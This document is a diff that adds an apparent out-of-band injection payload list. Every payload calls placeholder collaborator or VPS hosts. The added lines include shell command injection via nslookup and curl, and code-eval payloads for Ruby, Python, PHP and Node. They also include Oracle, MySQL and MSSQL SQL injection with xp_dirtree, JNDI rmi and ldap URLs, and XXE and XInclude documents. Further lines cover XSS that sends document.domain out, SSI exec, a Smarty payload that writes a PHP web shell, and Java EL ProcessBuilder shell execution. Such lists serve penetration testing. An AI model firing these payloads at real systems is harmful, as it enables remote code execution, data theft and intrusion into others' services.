@@ -1,3 +1,80 @@
+nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+`nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!`
+|nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&
+'"`0&nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&`'
+&nslookup -q=cname !-VARIABLE_COLLABORATOR-!&'\"`0&nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!&`'
++eval("require'socket'\nSocket.gethostbyname('!-VARIABLE_COLLABORATOR-!')")+'
+eval("require'socket'\nSocket.gethostbyname('!-VARIABLE_COLLABORATOR-!')")
+"+eval("require'socket'\nSocket.gethostbyname('!-VARIABLE_COLLABORATOR-!')")+"
+'+eval(compile('for x in range(1):\n import socket\n socket.gethostbyname("!-VARIABLE_COLLABORATOR-!")','a','single'))+'
+eval(compile('for x in range(1):\n import socket\n socket.gethostbyname("!-VARIABLE_COLLABORATOR-!")','a','single'))
+gethostbyname('!-VARIABLE_COLLABORATOR-!')
+'.gethostbyname('!-VARIABLE_COLLABORATOR-!').'
+'.gethostbyname("!-VARIABLE_COLLABORATOR-!").'
+{${gethostbyname("!-VARIABLE_COLLABORATOR-!")}}
+require('child_process').exec('nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!')
+'-require('child_process').exec('nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!')-'
+"-require("child_process").exec("nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!")-"
+<% require('child_process').exec('nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!'); %>
+<% require("child_process").exec("nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!"); %>
+||UTL_INADDR.get_host_address('!-VARIABLE_COLLABORATOR-!')
+'||UTL_INADDR.get_host_address('!-VARIABLE_COLLABORATOR-!')||'
+||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "!-VARIABLE_COLLABORATOR-!/ext1">%xxx;]>'),'/l')
+'||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "!-VARIABLE_COLLABORATOR-!/ext2">%xxx;]>'),'/l')||'
+UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING(!-VARIABLE_COLLABORATOR-!))
+ or chr(1)=UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING(!-VARIABLE_COLLABORATOR-!))
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "!-VARIABLE_COLLABORATOR-!/ext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+ or chr(1)=extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "!-VARIABLE_COLLABORATOR-!/ext4">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+(select load_file('\\\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\\c'))
+'+(select load_file('\\\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\\e'))+'
+;EXEC master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s'--
+1;EXEC master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s'--
+';EXEC master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s'--
+');EXEC master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s'--
+;EXEC master..xp_dirtree "\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s"--
+1;EXEC master..xp_dirtree "\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s"--
+";EXEC master..xp_dirtree "\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s"--
+");EXEC master..xp_dirtree "\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s"--
+"='';EXEC master..xp_dirtree "\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s"--
+"='');EXEC master..xp_dirtree "\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s"--
+;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+1;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+");DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+"='';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+"='');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+\';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\s');EXEC(@x)--
+rmi://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!/go
+ldap://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!/cn=bar,dc=test,dc=org
+" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="!-VARIABLE_COLLABORATOR-!/x.xsd
+<a xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="!-VARIABLE_COLLABORATOR-!/x.xsd"><b></b></a>
+<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="!-VARIABLE_COLLABORATOR-!/xincl"></xi:include></data>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE a SYSTEM "!-VARIABLE_COLLABORATOR-!/xxx"><a></a>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE x [<!ENTITY % xx SYSTEM "!-VARIABLE_COLLABORATOR-!/xxx">%xx;]><a></a>
+*/--></script></title></textarea></noscript></style></xmp></noembed></comment></noframes></xml></iframe>"'><script>document.write('<img src=//!-VARIABLE_VPS_IP_WITHOUT_HTTP-!/'+document.domain+'>')</script>
+*/--></script></title></textarea></noscript></style></xmp></noembed></comment></noframes></xml></iframe>"'><img src="//!-VARIABLE_VPS_IP_WITHOUT_HTTP-!/image.jpg">
+"-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!" -->
+javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/rkf9yyuox44dahzjkookgz001r7ovej6au1koaczX;.!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/).replace(/.;/g,[])]//'src=>
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!") }
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!']); ?>",self::clearConfig())}
+!-VARIABLE_COLLABORATOR-!
+https://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!
+%20{!xmlparser v='<!DOCTYPE a SYSTEM "!-VARIABLE_COLLABORATOR-!/sr"><a></a>'}%20
+" {!xmlparser v='<!DOCTYPE a SYSTEM "!-VARIABLE_COLLABORATOR-!/sr"><a></a>'} "
+") {!xmlparser v='<!DOCTYPE a SYSTEM "!-VARIABLE_COLLABORATOR-!/sr"><a></a>'} ("
+&shards=!-VARIABLE_COLLABORATOR-!/sr
+#{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\"]).start()")}
+}#{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\"]).start()")}#{
+#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\']).start()')}
+}#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\']).start()')}#{
+${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\"]).start()")}
+}${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\"]).start()")}${
+${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\']).start()')}
+}${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!\']).start()')}${
+
 curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
 curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
 curl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
